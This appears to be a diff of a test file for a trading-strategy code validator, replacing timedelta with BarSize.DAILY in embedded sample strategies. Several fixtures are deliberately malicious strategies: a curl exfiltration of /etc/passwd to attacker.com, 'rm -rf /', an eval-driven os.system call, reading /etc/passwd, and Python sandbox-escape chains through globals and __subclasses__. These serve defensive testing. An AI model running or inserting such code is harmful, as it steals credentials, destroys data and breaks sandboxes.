@@ -15,15 +15,14 @@ class MyStrategy(Strategy):
 
     VALID_BUYHOLD = """
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class BuyHoldStrategy(Strategy):
     def universe(self) -> list[str]:
         return ["AAPL"]
 
     def cadence(self) -> Cadence:
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data: Slice, portfolio: PortfolioView) -> dict[str, float] | None:
         return {"AAPL": 1.0}
@@ -33,8 +32,7 @@ class BuyHoldStrategy(Strategy):
 import numpy as np
 from collections import deque
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class SMAStrategy(Strategy):
     def __init__(self):
@@ -46,7 +44,7 @@ class SMAStrategy(Strategy):
         return ["SPY"]
 
     def cadence(self) -> Cadence:
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data: Slice, portfolio: PortfolioView) -> dict[str, float] | None:
         price = data.close("SPY")
@@ -72,15 +70,14 @@ class SMAStrategy(Strategy):
 import math
 from typing import Dict, Optional
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class EqualWeightStrategy(Strategy):
     def universe(self) -> list[str]:
         return ["AAPL", "MSFT", "GOOGL"]
 
     def cadence(self) -> Cadence:
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data: Slice, portfolio: PortfolioView) -> dict[str, float] | None:
         symbols = self.universe()
@@ -96,7 +93,6 @@ class EqualWeightStrategy(Strategy):
     VALID_NUMPY_PANDAS = """
 import numpy as np
 import pandas as pd
-from datetime import timedelta
 from collections import deque
 from hqg_algorithms import Strategy
 
@@ -180,15 +176,14 @@ class ComprehensionStrategy(Strategy):
     MALICIOUS_OS_IMPORT = """
 import os
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class MaliciousStrategy(Strategy):
     def universe(self):
         return ["AAPL"]
 
     def cadence(self):
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data, portfolio):
         os.system("curl http://attacker.com/exfil?data=$(cat /etc/passwd)")
@@ -198,15 +193,14 @@ class MaliciousStrategy(Strategy):
     MALICIOUS_SUBPROCESS_IMPORT = """
 import subprocess
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class RCEStrategy(Strategy):
     def universe(self):
         return ["AAPL"]
 
     def cadence(self):
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data, portfolio):
         subprocess.run(["rm", "-rf", "/"])
@@ -236,15 +230,14 @@ class BadStrategy(Strategy):
 
     MALICIOUS_EVAL = """
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class EvalStrategy(Strategy):
     def universe(self):
         return ["AAPL"]
 
     def cadence(self):
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data, portfolio):
         user_input = "__import__('os').system('whoami')"
@@ -263,15 +256,14 @@ class BadStrategy(Strategy):
 
     MALICIOUS_OPEN_FILE = """
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class FileReadStrategy(Strategy):
     def universe(self):
         return ["AAPL"]
 
     def cadence(self):
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data, portfolio):
         with open("/etc/passwd", "r") as f:
@@ -300,15 +292,14 @@ class BadStrategy(Strategy):
 
     MALICIOUS_GLOBALS_ACCESS = """
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class SandboxEscapeStrategy(Strategy):
     def universe(self):
         return ["AAPL"]
 
     def cadence(self):
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data, portfolio):
         fn = lambda: None
@@ -329,15 +320,14 @@ class BadStrategy(Strategy):
 
     MALICIOUS_CLASS_ESCAPE = """
 from hqg_algorithms import Strategy
-from hqg_algorithms.types import Cadence, Slice, PortfolioView
-from datetime import timedelta
+from hqg_algorithms.types import Cadence, Slice, PortfolioView, BarSize
 
 class TypeConfusionStrategy(Strategy):
     def universe(self):
         return ["AAPL"]
 
     def cadence(self):
-        return Cadence(bar_size=timedelta(days=1))
+        return Cadence(bar_size=BarSize.DAILY)
 
     def on_data(self, data, portfolio):
         cls = "".__class__.__bases__[0].__subclasses__()
